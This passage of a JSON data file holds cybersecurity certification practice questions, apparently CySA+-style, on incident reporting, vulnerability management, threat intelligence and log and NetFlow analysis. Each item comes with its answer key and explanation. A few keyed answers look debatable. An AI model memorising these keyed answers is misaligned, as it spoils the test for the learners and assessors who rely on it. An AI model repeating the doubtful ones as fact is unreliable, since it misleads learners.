monitoring"},{"id":"sg12-1","set":"sg","ch":12,"d":4,"q":"Why should organizations predetermine communication guidelines according to NIST?","o":["To limit how many individuals know sensitive incident information","To ensure compliance with federal law","To ensure that appropriate communications are shared with the right parties","To ensure consistency of communications"],"a":2,"e":"NIST guidelines note that predetermined communications ensure that appropriate communications are shared with the right parties.","l":"c12-ir-report","l2":"c9-foundation","k":"incident communication guidelines"},{"id":"sg12-2","set":"sg","ch":12,"d":4,"q":"Valentine is preparing a vulnerability management report. What data point will provide the greatest help in determining if patching programs are not succeeding?","o":["A list of affected hosts","Information about recurrence","Prioritization information","Risk scores"],"a":1,"e":"Information about recurrence will help Valentine determine if there is an ongoing issue with the patching program. For example, recurrence might demonstrate that the underlying base images for systems were not being patched, resulting in vulnerabilities when new instances of an image are being deployed.","l":"c12-vuln-report","l2":"","k":"vulnerability recurrence reporting"},{"id":"sg12-3","set":"sg","ch":12,"d":4,"q":"Jake wants to identify stakeholders for vulnerability management communications. Which stakeholder group is most likely to want information to be available via an API instead of a written communication?","o":["Security operations and oversight stakeholders","Audit and compliance stakeholders","System administration stakeholders","Management stakeholders"],"a":0,"e":"Security operations and oversight stakeholders will likely want to ingest vulnerability management data to perform data enrichment activities for other security systems. Audit and compliance, system administration, and management stakeholders are more likely to want written reports to review and use in their roles.","l":"c12-vuln-report","l2":"","k":"vulnerability management stakeholders"},{"id":"sg12-4","set":"sg","ch":12,"d":4,"q":"Thomas has prepared a document that includes an overview of a recent incident, a list of lessons learned, and action plans to remediate issues and close gaps identified as part the response. What has he prepared?","o":["An IOC analysis","A vulnerability report","An after-action report","A root-cause analysis"],"a":2,"e":"An after-action report is commonly prepared as part of post-incident reporting and typically includes an overview of the incident, lists of what went well and didn’t go well, lessons learned, action plans, and efforts to ensure continuous improvement occurs. IOC analysis is part of threat intelligence, not incident reporting, vulnerability reports report on vulnerabilities, not incidents, and a root-cause analysis might be part of an after-action report but won’t include all of the other detail listed here.","l":"c12-ir-report","l2":"","k":"after action report"},{"id":"sg12-5","set":"sg","ch":12,"d":4,"q":"Which of the following potential incident response metrics is least useful in understanding the organization’s ability to respond to incidents?","o":["Mean time to detect","Alert volume","Mean time to respond","Mean time to remediate"],"a":1,"e":"Simply knowing the volume of alerts for an organization is not a useful metric without context. It may indicate that the organization has a poorly tuned alerting system, that the system does not detect most events, or that there are other issues. Mean time to detect, mean time to respond, and mean time to remediate provide more useful information, although each requires context as well.","l":"c12-ir-report","l2":"","k":"incident response metrics"},{"id":"sg12-6","set":"sg","ch":12,"d":4,"q":"Why might a service level agreement cause an organization to delay patching?","o":["To force vendor compliance","To remain compliance with licensing","To achieve organizational governance targets","To meet performance targets defined by the SLA"],"a":3,"e":"Service-level agreements (SLAs) often have performance targets like uptime included. Organizations that need to meet an SLA may delay patching to ensure they meet their overall uptime guarantees. SLAs and patching are not typically used to force vendor compliance or to ensure license compliance, nor are they likely to impact organizational governance targets.","l":"c12-vuln-report","l2":"","k":"SLA patching inhibitors"},{"id":"sg12-7","set":"sg","ch":12,"d":4,"q":"Ian’s organization has identified an incident that involves protected health information. What type of third-party report is he likely to be required to produce as part of his incident handling process?","o":["A public vulnerability report","A report to a regulatory reporting agency","A report to an acquiring bank","A stakeholder analysis report"],"a":1,"e":"Ian’s organization likely has a requirement to report to a regulatory reporting agency when protected health information is exposed. Reporting publicly on vulnerabilities is not typically a requirement for incidents, acquiring banks would deal with credit card information, and stakeholder analysis reports are internal documents in most cases.","l":"c12-ir-report","l2":"","k":"regulatory breach reporting"},{"id":"sg12-8","set":"sg","ch":12,"d":4,"q":"Sally is preparing an incident response report. What part of the report will provide a short, clearly written summary of the incident, its impact, and its current state?","o":["The executive summary","The TLDR","The scope","The recommendations"],"a":0,"e":"Executive summaries provide clear, brief explanations of the report intended to allow readers to quickly grasp critical information. TLDR, while a commonly used acronym for “too long, didn’t read,” isn’t a term used for professional reports like this. Scope, and recommendations both help describe the incident but aren’t summaries.","l":"c12-ir-report","l2":"","k":"executive summary incident report"},{"id":"sg12-9","set":"sg","ch":12,"d":4,"q":"Jaime is concerned that her organization may face multiple inhibitors to remediation. Which of the following inhibitors to remediation is most often associated with performance or uptime targets?","o":["Organizational governance","Legacy systems","Memorandums of understanding","Proprietary systems"],"a":2,"e":"Memorandums of understanding (MOUs) are often associated with performance or uptime targets that may not be met if systems are taken offline for patching. Jaime should review her infrastructure designs, MOUs, and patching processes to determine if they are all appropriate to what her organization can accomplish and needs to do to stay secure.","l":"c12-vuln-report","l2":"","k":"remediation inhibitors"},{"id":"sg12-10","set":"sg","ch":12,"d":4,"q":"Selah wants to include sections of relevant logs in her incident report. What report section most frequently includes logs?","o":["In the timeline","As part of the executive summary","As evidence in the appendix","As part of the recommendations"],"a":2,"e":"Detailed evidence like logs are typically attached as evidence in an appendix.","l":"c12-ir-report","l2":"","k":"incident report appendix evidence"},{"id":"sg12-11","set":"sg","ch":12,"d":4,"q":"Danielle has completed her incident report and wants to ensure that her organization benefits from the process. What exercise is most frequently conducted after the report to improve future IR processes?","o":["Media training","Government compliance reporting","A lessons-learned exercise","A mandatory report to auditors"],"a":2,"e":"A lessons-learned exercise is used to ensure that organizations leverage their findings and experiences from incidents. Media training is useful, and a need for it might be a lesson learned, but it is not a typical follow-up. Reporting to the government or auditors is also not a typical process improvement step after an incident.","l":"c12-ir-report","l2":"c9-process","k":"lessons learned exercise"},{"id":"sg12-12","set":"sg","ch":12,"d":4,"q":"Nick’s team is dealing with an incident response process that impacts most of his organization’s infrastructure and will require days, if not weeks, to remediate. What process should he ensure is followed to help ensure the response goes well?","o":["Incident handover","After-action reports","A lessons-learned process","Root-cause analysis"],"a":0,"e":"During an incident ensuring that incident handover processes are followed will help to keep teams focused on what has been done and what needs to be done next. Once the incident is over, lessons learned, root-cause analysis, and after-action reports are all useful to help the organization be ready for future issues—or to avoid them!","l":"c12-ir-report","l2":"","k":"shift and incident handover"},{"id":"sg12-13","set":"sg","ch":12,"d":4,"q":"Michelle is performing root-cause analysis. Which of the following is not one of the four common steps in an RCA exercise?","o":["Documenting the root-cause analysis using a chart or diagram","Establishing a timeline of events","Determining which individual or team was responsible for the problem","Identifying the problems and events that occurred during the event and describing them as completely as possible"],"a":2,"e":"Root-cause analysis exercises are not designed or intended to determine who to blame. Instead, they focus on identifying the root cause so that it can be remediated.","l":"c12-ir-report","l2":"c9-process","k":"root cause analysis"},{"id":"sg12-14","set":"sg","ch":12,"d":4,"q":"The organization that Charles works for has experienced a significant incident. Which of the following is most likely to require the organization to report the incident in a specific timeframe?","o":["Organizational policy","Internal governance","Regulatory compliance","Media requirements"],"a":2,"e":"Internal requirements are unlikely to require an incident report in a specific timeline, as they typically acknowledge the complexity of incident response. While the media may want a report in specific timeframe, that does not require a response. Instead, of the listed items, regulatory compliance is the primary driver for reporting in a specific timeline for most organizations.","l":"c12-ir-report","l2":"","k":"regulatory reporting compliance"},{"id":"sg12-15","set":"sg","ch":12,"d":4,"q":"After testing, Jim’s team has determined that installing a patch will result in degraded functionality due to a service being modified. What should Jim suggest to address this inhibitor to remediation?","o":["Take the change through organizational governance.","Identify a compensating control.","Replace the legacy system.","Update the service level agreement."],"a":1,"e":"The best option that Jim has will likely be to identify a compensating control. This may not be a suitable solution in the long term, and Jim’s organization may need to change their service or design to allow for the security fix to be put in place. Organizational governance won’t change the functional impact, no legacy system is mentioned, nor is there an SLA listed in the question.","l":"c12-vuln-report","l2":"c8-controls","k":"compensating security controls"},{"id":"sg12-16","set":"sg","ch":12,"d":4,"q":"Taylor has been reviewing her organization’s vulnerability scans and has determined that a recent Microsoft Windows patch is properly installed on 900 out of 910 systems, but her vulnerability scanner shows that only 289 of the systems have it installed. Which of the following KPIs will be most directly impacted by this?","o":["Mean time to detect","Alert volume","Mean time to close","False-positive rate"],"a":3,"e":"Since the vulnerability scanner is not properly detecting the installed patch, it will have a higher false-positive rate for vulnerability detection. The mean time to detect cannot be determined from the question. Alert volume deals with how many alerts are being received and is more often associated with incidents and events than vulnerabilities. Mean time to close will be impacted if the false positives are not dealt with, but are not as direct of an impact.","l":"c12-vuln-report","l2":"c7-validate","k":"vulnerability scanner false positive rate"},{"id":"sg12-17","set":"sg","ch":12,"d":4,"q":"Ava has discovered that installing the patch required to remediate a vulnerability will result in the application not working properly. She knows she shouldn’t make the decision alone and needs to engage leadership. What is this process called?","o":["Remediation","Escalation","Patch preparation","Dependency analysis"],"a":1,"e":"Escalation processes are used when broader input is needed or when leadership needs to be engaged. Remediation occurs when an issue or vulnerability is resolved. Patch preparation is not a commonly used term, and dependency analysis occurs when dependencies are reviewed to check for potential problems. Dependency analysis might have caused escalation here but is not the process that occurs next.","l":"c12-vuln-report","l2":"","k":"vulnerability remediation escalation"},{"id":"sg12-18","set":"sg","ch":12,"d":4,"q":"The security team that Chris works on has been notified of a zero-day vulnerability in Windows Server that was released earlier in the morning. Chris’s manager asks Chris to immediately check recent vulnerability reports to determine if the organization is impacted. What should Chris tell his manager?","o":["That the reports will need rerun to list the zero-day vulnerability.","He needs to update the vulnerability scanner to detect the zero-day vulnerability.","Zero-day vulnerabilities won’t show in previously run vulnerability management reports.","That zero-day vulnerabilities cannot be detected."],"a":2,"e":"Chris knows that a zero-day vulnerability means that the scanner won’t have had a rule or detection profile for the vulnerability. That means previously run reports and scans won’t show it. It’s possible that their vendor may release a detection profile or rule for the zero-day, but with very little time from release to the request, that is unlikely to have occurred already. Rerunning reports won’t show unknown vulnerabilities, and zero-day vulnerabilities can be detected if there’s a rule.","l":"c12-vuln-report","l2":"","k":"zero day vulnerability reporting"},{"id":"sg12-19","set":"sg","ch":12,"d":4,"q":"Mikayla’s organization has identified an ongoing problem based on their vulnerability management dashboard reports. Trends indicate that patching is not occurring in a timely manner and that patches are not being installed for some of the most critical vulnerabilities. What should Mikayla do if she believes that system administrators are not prioritizing patching?","o":["Engage in awareness, education, and training activities.","Assess changing business requirements.","Deploy compensating controls.","Engage management to punish administrators who are not patching."],"a":0,"e":"Mikayla knows that awareness and education are the first step to ensuring that staff are aware of the importance of patching. Her first step should be ensuring appropriate awareness, education, and training are in place. There is no indication of changing business requirements; compensating controls should be used only if they are needed, not as a general practice; and punishment is unlikely to resolve the underlying issues.","l":"c12-vuln-report","l2":"","k":"security awareness and training"},{"id":"sg12-20","set":"sg","ch":12,"d":4,"q":"Reese’s organization operates a critical system provided by a vendor that specifies that the operating system cannot be patched. What type of solution should Reese recommend when her vulnerability reporting shows the system is behind on patching and has critical vulnerabilities?","o":["Mark the vulnerabilities as unable to be remediated and continue operations to ensure business continuity.","Shut off the system until a solution can be identified.","Install the operating system patch and test if it causes issues.","Identify and deploy a compensating control."],"a":3,"e":"Reese should identify a compensating control that will appropriately ensure the security of the system with minimal impact to its functionality. Examples might be placing a network firewall logically in front of the device, moving it to an isolated and secured network segment or VLAN, or otherwise adding protection. Marking the vulnerability as unable to be remediated does not protect the system or the company, shutting it off will impact the organization’s ability to function, and installing the patches may cause functional issues or prevent vendor support.","l":"c12-vuln-report","l2":"c8-controls","k":"compensating control deployment"},{"id":"d1-1","set":"d1","ch":4,"d":1,"q":"Olivia is considering potential sources for threat intelligence information that she might incorporate into her security program. Which one of the following sources is most likely to be available without a subscription fee?","o":["Vulnerability feeds","Open source","Closed source","Proprietary"],"a":1,"e":"Open source intelligence is freely available information that does not require a subscription fee. Closed source and proprietary intelligence are synonyms and do involve payments to the providers. Vulnerability feeds may be considered threat intelligence, but they normally come with subscription fees.","l":"c4-collect","l2":"","k":"open-source threat intelligence"},{"id":"d1-2","set":"d1","ch":4,"d":1,"q":"Roger is evaluating threat intelligence information sources and finds that one source results in quite a few false positive alerts. This lowers his confidence level in the source. What criterion for intelligence is not being met by this source?","o":["Timeliness","Expense","Relevance","Accuracy"],"a":3,"e":"An intelligence source that results in false positive errors is lacking in accuracy because it is providing incorrect results to the organization. Those results may still be timely and relevant, but they are not correct. Expense is not one of the three intelligence criteria.","l":"c4-collect","l2":"","k":"threat intelligence accuracy"},{"id":"d1-3","set":"d1","ch":3,"d":1,"q":"Helen wants to decode a Base64-encoded file that she believes is part of a threat actor’s toolkit. Which of the following tools can she use to do so?","o":["Strings","CyberChef","md5sum","<code>grep</code>"],"a":1,"e":"CyberChef provides a broad range of encoding, decoding, and transforms ranging from Base64, hex, and octal to building HTTP requests, parsing TCP, doing encryption and decryption in a wide variety of ciphers, and many more. Strings are useful for pulling strings out of binary files, but does not transform to or from Base64-encoded files. The md5sum utility calculates a hash and can compare them, while <code>grep</code> is used to find text through pattern matching.","l":"c3-tools","l2":"","k":"CyberChef decoding"},{"id":"d1-4","set":"d1","ch":3,"d":1,"q":"Mikayla wants to deploy a tool to analyze network packets, including application layer data as part of her threat hunting practice. Which of the following tools is specifically designed to act in that role?","o":["Snort","Zeek","Suricata","Security Onion"],"a":1,"e":"Zeek is purpose-built to act as a network traffic analysis and monitoring tool rather than acting like a traditional IDS/IPS like Snort or Suricata, which operate using rule-based detections. Security Onion is a SIEM tool used to centralize and analyze logs and other data.","l":"c3-tools","l2":"c4-hunt","k":"Zeek network traffic analysis"},{"id":"d1-5","set":"d1","ch":3,"d":1,"q":"Singh incorporated the Cisco Talos tool into his organization’s threat intelligence program. He uses it to automatically look up information about the past activity of IP addresses sending email to his mail servers. What term best describes this intelligence source?","o":["Open source","Behavioral","Reputational","Indicator of compromise"],"a":2,"e":"This source provides information about IP addresses based on <i>past</i> behavior. This makes it a reputational source. A behavioral source would look at information about <i>current</i> behavior. This is a product offered by Cisco and is proprietary, not open source. It does not provide indicators that would help you determine whether your system had been compromised.","l":"c3-tip-edr","l2":"c4-collect","k":"IP reputation intelligence"},{"id":"d1-6","set":"d1","ch":2,"d":1,"q":"Jessica wants to deploy technology that will allow her remote-work focused organization to maintain secure connectivity regardless of where her users and infrastructure are located. Which of the following combines SD-WAN, ZTNA, and firewall as a service (FWaaS) into a single solution that she can deploy?","o":["SaaS","SOAR","IaaS","SASE"],"a":3,"e":"SASE, or Secure Access Service Edge, is a cybersecurity framework that uses SD-WAN, zero-trust network access, and firewall as a service to allow remote users to securely connect to distributed services while focusing on identity as a key component. SASE is typically cloud-based, allowing central management of users and systems. SaaS, or software as a service, and IaaS, or infrastructure as a service, are cloud delivery models, and SOAR is Security Orchestration, Automation, and Response, a toolset used to help with incident response.","l":"c2-netarch","l2":"","k":"SASE architecture"},{"id":"d1-7","set":"d1","ch":4,"d":1,"q":"Ava’s cyber deception strategy includes the use of a honeynet, shown here, which is configured to use a segment of unused network space that has no legitimate servers in it. This design is particularly useful for detecting what types of threats?\n<figure><img alt=\"Network diagram depicts an internet cloud linked to a Border Router, a switch, a Firewall, an Internal Trusted Zone, and a Honeynet.\" loading=\"lazy\" src=\"img/pt/c01un001.png\"/></figure>","o":["Zero-day attacks","SQL injection","Network scans","DDoS attacks"],"a":2,"e":"Detection systems placed in otherwise unused network space will detect network scans that blindly traverse IP address ranges. Since no public services are listed, attackers who scan this range can be presumed to be hostile and are often immediately blocked by security devices that protect production systems.","l":"c4-hunt","l2":"c1-network","k":"honeynet deception"},{"id":"d1-8","set":"d1","ch":3,"d":1,"q":"Fred believes that the malware he is tracking uses a fast flux DNS network, which associates many IP addresses with a single fully qualified domain name as well as using multiple download hosts. How many distinct hosts should he review based on the NetFlow shown here?\n<pre>\n<code>Date flow start   Duration     Proto    Src      IP Addr:Port  Dst IP Addr:Port      Packets   Bytes   Flows</code>\n<code>2020-07-11        14:39:30.606 0.448    TCP      192.168.2.1:1451-&gt;10.2.3.1:443      10        1510    1</code>\n<code>2020-07-11        14:39:30.826 0.448    TCP      10.2.3.1:443-&gt;192.168.2.1:1451      7         360     1</code>\n<code>2020-07-11        14:45:32.495 18.492   TCP      10.6.2.4:443-&gt;192.168.2.1:1496      5         1107    1</code>\n<code>2020-07-11        14:45:32.255 18.888   TCP      192.168.2.1:1496-&gt;10.6.2.4:443      11        1840    1</code>\n<code>2020-07-11        14:46:54.983 0.000    TCP      192.168.2.1:1496-&gt;10.6.2.4:443      1         49      1</code>\n<code>2020-07-11        16:45:34.764 0.362    TCP      10.6.2.4:443-&gt;192.168.2.1:4292      4         1392    1</code>\n<code>2020-07-11        16:45:37.516 0.676    TCP      192.168.2.1:4292-&gt;10.6.2.4:443      4         462     1</code>\n<code>2020-07-11        16:46:38.028 0.000    TCP      192.168.2.1:4292-&gt;10.6.2.4:443      2         89      1</code>\n<code>2020-07-11        14:45:23.811 0.454    TCP      192.168.2.1:1515-&gt;10.6.2.5:443      4         263     1</code>\n<code>2020-07-11        14:45:28.879 1.638    TCP      192.168.2.1:1505-&gt;10.6.2.5:443      18        2932    1</code>\n<code>2020-07-11        14:45:29.087 2.288    TCP      10.6.2.5:443-&gt;192.168.2.1:1505      37        48125   1</code>\n<code>2020-07-11        14:45:54.027 0.224    TCP      10.6.2.5:443-&gt;192.168.2.1:1515      2         1256    1</code>\n<code>2020-07-11        14:45:58.551 4.328    TCP      192.168.2.1:1525-&gt;10.6.2.5:443      10        648     1</code>\n<code>2020-07-11        14:45:58.759 0.920    TCP      10.6.2.5:443-&gt;192.168.2.1:1525      12        15792   1</code>\n<code>2020-07-11        14:46:32.227 14.796   TCP      192.168.2.1:1525-&gt;10.8.2.5:443      31        1700    1</code>\n<code>2020-07-11        14:46:52.983 0.000    TCP      192.168.2.1:1505-&gt;10.8.2.5:443      1         40      1</code>\n</pre>","o":["1","3","4","5"],"a":2,"e":"This flow sample shows four distinct hosts being accessed from 192.168.2.1. They are 10.2.3.1, 10.6.2.4, 10.6.2.5, and 10.8.2.5.","l":"c3-network","l2":"","k":"NetFlow traffic analysis"},{"id":"d1-9","set":"d1","ch":3,"d":1,"q":"Brian accidentally typed the URL for his bank incorrectly and was redirected to a site that appears to be the bank’s website. Further analysis shows that it is a malicious site designed to look the same. What has he encountered?","o":["A URL shortener","Typosquatting","An HTTP redirect","DNS manipulation"],"a":1,"e":"Typosquatting occurs when malicious or other actors register domains that may be hit when users incorrectly type a URL. This allows them to capture traffic meant for the original site. Not all typosquatting is directly malicious—some just redirect users to another site. URL shorteners make URLs shorter, often using easily typed replacement URLs, but they can also be used to conceal malicious links. HTTP redirects simply send traffic from one URL to another. DNS manipulation would rely on DNS rather than a typo.","l":"c3-cloud-social","l2":"","k":"typosquatting domain attack"},{"id":"d1-10","set":"d1","ch":3,"d":1,"q":"Jill’s SIEM flags a user who has authenticated in Washington, DC, who then authenticates from Russia two hours later. What type of identity based indicator should she flag this as?","o":["Impossible travel","International travel","VPN abuse","IAM account compromise"],"a":0,"e":"This is an example of impossible travel, which occurs when a user authenticates from locations they cannot reasonably have traveled to during the time between logins. It is possible that the underlying issue is use of a VPN, but VPN abuse is not a common term of practice. International travel may have occurred, but it would take longer than the two hours listed. IAM account compromise occurs when IAM user access keys or other credentials are exposed, resulting in privileged accounts controlling IAM being compromised.","l":"c3-cloud-social","l2":"c3-uba-scripting","k":"impossible travel indicator"},{"id":"d1-11","set":"d1","ch":4,"d":1,"q":"Harsh has observed an APT threat actor that is targeting his organization. His team noticed that each time the threat actor compromises a system they download a package of tools, perform network reconnaissance, then remove evidence of their actions using a cleanup script. What type of IoC best describes this?","o":["OSINT","Atomic","Advanced","Behavioral"],"a":3,"e":"Harsh’s team has observed a set of behaviors, making this a behavioral indicator of compromise (IoC). Atomic IoCs are individual data points like IP addresses or file hashes. OSINT and advanced are not used to describe IoC types.","l":"c4-hunt","l2":"c4-classify","k":"behavioral indicators of compromise"},{"id":"d1-12","set":"d1","ch":2,"d":1,"q":"The company that Maria works for is making significant investments in infrastructure-as-a-service hosting to replace its traditional datacenter. Members of her organization’s management have raised concerns about data remanence when her team moves from one virtual host to another in their cloud service provider’s environment. What should Maria instruct her team to do to avoid this concern?","o":["Zero-wipe drives before moving systems.","Use full-disk encryption.","Use data masking.","Span multiple virtual disks to fragment data."],"a":1,"e":"Maria’s team should use full-disk encryption or volume encryption and should secure the encryption keys properly. This will ensure that any data that remains cannot be exposed to future users of the virtual infrastructure. Although many cloud providers have implemented technology to ensure that this won’t happen, Maria can avoid any potential issues by ensuring that she has taken proactive action to prevent data exposure. Using a zero-wipe is often impossible because virtual environments may move without her team’s intervention, data masking will not prevent unmasked data or temporary data stored on the virtual disks from being exposed, and spanning multiple virtual disks will still leave data accessible, albeit possibly in fragmented form.","l":"c2-crypto","l2":"c2-infra","k":"full-disk encryption data remanence"},{"id":"d1-13","set":"d1","ch":2,"d":1,"q":"Kaiden is configuring a SIEM service in his IaaS cloud environment that will receive all of the log entries generated by other devices in that environment. Which one of the following risks is greatest with this approach in the event of a DoS attack or other outage?","o":["Inability to access logs","Insufficient logging","Insufficient monitoring","Insecure API"],"a":0,"e":"The greatest risk in the event of a DoS attack is that the logs are stored in the same cloud environment that is under attack. Cybersecurity professionals may not be able to access those logs to investigate the incident.","l":"c2-logging","l2":"c2-infra","k":"cloud log availability risk"},{"id":"d1-14","set":"d1","ch":4,"d":1,"q":"Mike is assessing a cloud-hosted web application using the STRIDE threat modeling process. He has identified a potential threat that allows a malicious actor to initiate a password reset for a legitimate user while intercepting the reset email and allowing the threat actor to reset the password and access the account. What STRIDE category should he identify this threat as?","o":["Spoofing","Tampering","Repudiation","Elevation of privilege"],"a":1,"e":"Mike should identify this as a tampering attack because the primary threat is modification of the user’s password. The attacker is not spoofing via impersonation, the action is not being denied and thus isn’t repudiation, and no elevated privilege is described.","l":"c4-classify","l2":"","k":"STRIDE threat modeling"},{"id":"d1-15","set":"d1","ch":3,"d":1,"q":"Lucas believes that an attacker has successfully compromised his web server. Using the following output of <code>ps</code>, identify the process ID he should focus on:\n<pre>\n<code>root      507  0.0  0.1 258268  3288 ?     Ssl  15:52  0:00 /usr/sbin/rsyslogd -n</code>\n<code>message+  508  0.0  0.2  44176  5160 ?     Ss   15:52  0:00 /usr/bin/dbusdaemon --system --address=systemd: --nofork --nopidfile --systemd-activa</code>\n<code>root      523  0.0  0.3 281092  6312 ?     Ssl  15:52  0:00 /usr/lib/accountsservice/accounts-daemon</code>\n<code>root      524  0.0  0.7 389760 15956 ?     Ssl  15:52  0:00 /usr/sbin/NetworkManager --no-daemon</code>\n<code>root      527  0.0  0.1  28432  2992 ?     Ss   15:52  0:00 /lib/systemd/systemd-logind</code>\n<code>apache    714  0.0  0.1  27416  2748 ?     Ss   15:52  0:00 /www/temp/webmin</code>\n<code>root      617  0.0  0.1  19312  2056 ?     Ss   15:52  0:00 /usr/sbin/irqbalance --pid=/var/run/irqbalance.pid</code>\n<code>root      644  0.0  0.1 245472  2444 ?     Sl   15:52  0:01 /usr/sbin/VBoxService</code>\n<code>root      653  0.0  0.0  12828  1848 tty1  Ss+  15:52  0:00 /sbin/agetty --noclear tty1 linux</code>\n<code>root      661  0.0  0.3 285428  8088 ?     Ssl  15:52  0:00 /usr/lib/policykit-1/polkitd --no-debug</code>\n<code>root      663  0.0  0.3 364752  7600 ?     Ssl  15:52  0:00 /usr/sbin/gdm3</code>\n<code>root      846  0.0  0.5 285816 10884 ?     Ssl  15:53  0:00 /usr/lib/upower/upowerd</code>\n<code>root      867  0.0  0.3 235180  7272 ?     Sl   15:53  0:00 gdm-session-worker [pam/gdm-launch-environment]</code>\n<code>Debian-+  877  0.0  0.2  46892  4816 ?     Ss   15:53  0:00 /lib/systemd/systemd --user</code>\n<code>Debian-+  878  0.0  0.0  62672  1596 ?     S    15:53  0:00 (sd-pam)</code>\n</pre>","o":["508","617","846","714"],"a":3,"e":"The 714 service running from the <code>www</code> directory as the user <code>apache</code> should be an immediate indication of something strange, and the use of <code>webmin</code> from that directory should also be a strong indicator of something wrong. Lucas should focus on the web server for the point of entry to the system and should review any files that the Apache user has created or modified. If local vulnerabilities existed when this compromise occurred, the attacker may have already escalated to another account!","l":"c3-host","l2":"","k":"suspicious Linux processes"},{"id":"d1-16","set":"d1","ch":4,"d":1,"q":"The Pyramid of Pain includes six challenge ratings describing how much pain preventing specific indicators from being used causes malicious actors. What rating do elements like hash values have in the Pyramid of Pain?","o":["Challenging","Annoying","Simple","Trivial"],"a":3,"e":"Hash values are trivial—it’s extremely easy to change one. TTPs are tough, tools are challenging, network and host artifacts are annoying to deal with not having access to, domain names are simple, and IP addresses are easy.","l":"c4-classify","l2":"","k":"Pyramid of Pain"},{"id":"d1-17","set":"d1","ch":2,"d":1,"q":"Which of the following concerns typically does not drive limits on log retention?","o":["Legal requirements","Storage space","Legal discovery","Log complexity"],"a":3,"e":"Legal requirements may define how long logs must be retained for, while legal discovery risks may drive organizations to limit their log retention timeframes. Storage space is a frequent driver of log retention time limits. Log complexity is not a typical driver of what logs are retained.","l":"c2-logging","l2":"","k":"log retention requirements"},{"id":"d1-18","set":"d1","ch":3,"d":1,"q":"Angela wants to gather network traffic from systems on her network. What tool can she use to best achieve this goal?","o":["Nmap","Wireshark","Sharkbait","Dradis"],"a":1,"e":"Angela can use Wireshark, a tool that can capture network traffic using a graphical user interface to meet this objective. Nmap is a tool used to perform port scans. Dradis is an open source collaboration platform for security teams, and Sharkbait is not a security tool or term.","l":"c3-tools","l2":"","k":"Wireshark packet capture"},{"id":"d1-19","set":"d1","ch":6,"d":1,"q":"While reviewing Apache logs, Janet sees the following entries as well as hundreds of others from the same source IP address. What should Janet report has occurred?\n<pre>\n<code>[21/Jul/2020:02:18:33 -0500] - - 10.0.1.1 \"GET /scripts/sample.php\" \"-\" 302 336 0</code>\n<code>[21/Jul/2020:02:18:35 -0500] - - 10.0.1.1 \"GET /scripts/test.php\" \"-\" 302 336 0</code>\n<code>[21/Jul/2020:02:18:37 -0500] - - 10.0.1.1 \"GET /scripts/manage.php\" \"-\" 302 336 0</code>\n<code>[21/Jul/2020:02:18:38 -0500] - - 10.0.1.1 \"GET /scripts/download.php\" \"-\" 302 336 0</code>\n<code>[21/Jul/2020:02:18:40 -0500] - - 10.0.1.1 \"GET /scripts/update.php\" \"-\" 302 336 0</code>\n<code>[21/Jul/2020:02:18:42 -0500] - - 10.0.1.1 \"GET /scripts/new.php\" \"-\" 302 336 0</code>\n</pre>","o":["A denial-of-service attack","A vulnerability scan","A port scan","A directory traversal attack"],"a":1,"e":"Testing for common sample and default files is a common tactic for vulnerability scanners. Janet can reasonably presume that her Apache web server was scanned using a vulnerability scanner.","l":"c6-config","l2":"c3-tools","k":"vulnerability scanning log indicators"},{"id":"d1-20","set":"d1","ch":2,"d":1,"q":"Scott’s organization has deployed a combination of on-premises and Azure hosted servers allowing them to remain online even if their Internet connectivity is interrupted. What network architecture concept are they using?","o":["On-premises","Edge","Hybrid cloud","Cloud native"],"a":2,"e":"This is an example of a hybrid cloud design with both on-premises and cloud hosting. On-premises only wouldn’t use cloud, edge computing places resources closer to where they’re being consumed, and cloud-native wouldn’t have on-premises services.","l":"c2-netarch","l2":"c2-infra","k":"hybrid cloud architecture"},{"id":"d1-21","set":"d1","ch":5,"d":1,"q":"Jennifer analyzes a Wireshark packet capture from a network that she is unfamiliar with. She discovers that a host with IP address 10.11.140.13 is running services on TCP ports 636 and 443. What services is that system most likely running?","o":["LDAPS and HTTPS","FTPS and HTTPS","RDP and HTTPS","HTTP and Secure DNS"],"a":0,"e":"TCP port 636 is often used for secure LDAPS, and secure HTTP typically uses TCP 443. Although other services could use these ports, Jennifer’s best bet is to presume that they will be providing the services they are typically associated with.","l":"c5-portscan","l2":"c3-tools","k":"common service port identification"},{"id":"d1-22","set":"d1","ch":3,"d":1,"q":"While tracking a potential APT on her network, Cynthia discovers a network flow for her company’s central file server. What does this flow entry most likely show if 10.2.2.3 is not a system on her network?\n<pre>\n<code>Date flow start     Duration Proto          Src   IP Addr:Port   Dst IP Addr:Port   Packets    Bytes    Flows</code>\n<code>2017-07-11          13:06:46.343 21601804   TCP   10.1.1.1:1151-&gt;10.2.2.3:443       9473640    9.1 G    1</code>\n<code>2017-07-11          13:06:46.551 21601804   TCP   10.2.2.3:443-&gt;10.1.1.1:1151       8345101    514 M    1</code>\n</pre>","o":["A web browsing session","Data exfiltration","Data infiltration","A vulnerability scan"],"a":1,"e":"Large data flows leaving an organization’s network may be a sign of data exfiltration by an advanced persistent threat. Using HTTPS to protect the data while making it look less suspicious is a common technique.","l":"c3-network","l2":"","k":"data exfiltration detection"},{"id":"d1-23","set":"d1","ch":7,"d":1,"q":"SCADA and ICS are both examples of which of the following types of infrastructure?","o":["Cloud","Edge computing","Operational technology","Hybrid cloud"],"a":2,"e":"ICS and SCADA are both examples of operational technology (OT) used to control physical operations like utilities and manufacturing. Cloud, edge, and hybrid are all infrastructure models that are primarily service oriented rather than physical infrastructure control oriented.","l":"c7-web-ot","l2":"c2-infra","k":"operational technology SCADA ICS"},{"id":"d1-24","set":"d1","ch":2,"d":1,"q":"Scott is designing a web application that will leverage a Git repository for code updates as part of a development pipeline. He knows that developers at his company have accidentally embedded credentials including passwords in the Git repository leading to issues. What type of technology should he investigate as a possible solution via his cloud provider?","o":["Code versioning","Multifactor authentication","Secrets management","Software vulnerability management"],"a":2,"e":"Secrets management tools allow calls to a secrets manager to be embedded, preventing secrets from needing to be embedded in code and thus ending up in a repository. Code versioning is used to track versions of code and to allow for reversion to older versions if needed. Multifactor authentication does not stop secrets from being embedded, but may limit the impact if only a password or other factor were embedded. Software vulnerability management helps with vulnerabilities but not with embedded credentials and credential leakage.","l":"c2-federation","l2":"","k":"secrets management"},{"id":"d1-25","set":"d1","ch":5,"d":1,"q":"Kwame is reviewing his team’s work as part of a reconnaissance effort and is checking Wireshark packet captures. His team reported no open ports on 10.0.2.15. What issue should he identify with their scan based on the capture shown here?\n<figure><img alt=\"Screenshot of a table details rows of U D P network packet data from source 10.0.2.4 to destination 10.0.2.15 with a packet length of 60.\" loading=\"lazy\" src=\"img/pt/c01un002.png\"/></figure>","o":["The host was not 